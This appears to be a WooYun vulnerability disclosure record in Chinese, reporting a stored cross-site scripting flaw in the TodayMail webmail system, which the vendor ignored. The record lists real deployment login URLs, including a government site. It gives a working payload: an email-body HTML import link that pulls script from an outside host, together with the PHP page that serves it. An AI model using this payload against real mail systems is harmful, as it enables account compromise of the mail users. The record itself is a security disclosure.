{"id": 69132, "wybug_id": "wooyun-2015-0127269", "wybug_title": "时代互联TodayMail系统高危xss（官方demo复现）", "wybug_corp": "广东时代互联科技有限公司", "wybug_author": "路人甲", "wybug_date": "2015-07-20 14:24", "wybug_open_date": "2015-10-23 14:27", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-25：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-23：\t细节向公众公开  简要描述： 时代互联TodayMail系统高危xss（官方demo复现） 详细说明：  时代互联旗下的邮件系统存在通用注入， 时代互联官网：now.cn 涉及大量网站，包括政府站点，使用量绝对是海量级别的： \nhttp://mail.wfq.gov.cn/webmail/login.php?Cmd=login http://mail.totalfitness.com.cn/webmail/login.php?Cmd=login http://mail.qtc.org.cn/webmail/login.php?Cmd=login http://mail.yphb.com.cn/webmail/login.php?Cmd=loginhttp://mail.power-ring.cn/webmail/login.php?Cmd=login ----------------------\nchrome在36版本之后多了一种可以引入外部的HTML的方法：\n<link href=http://a.com/a.html rel=import />\ntwitter上MK很早就通过这个方法bypass了当时的chrome audit：https://twitter.com/avlidienbrunn/status/486059626002395136，但实际上这个方法的危害不止于此，大部分基于黑名单的富文本过滤器是没有考虑这个方式的XSS的，通过这个就能简单构造一个XSS。\n<?phpheader(\"Access-Control-Allow-Origin: *\");?><script>alert(location.host);</script>\n需要输出\"Access-Control-Allow-Origin: *\"头，否则那边是没法跨域请求我的。邮件正文填写如下html：\n<link href=http://www.nosvip.com/oa2/lib/vul.php rel=import />\n即可触发（可见域为email的域而非nosvip.com）：\n\n\n\n   漏洞证明：     修复方案：  厂商多和wooyun联系交流   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-10-23 14:27 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}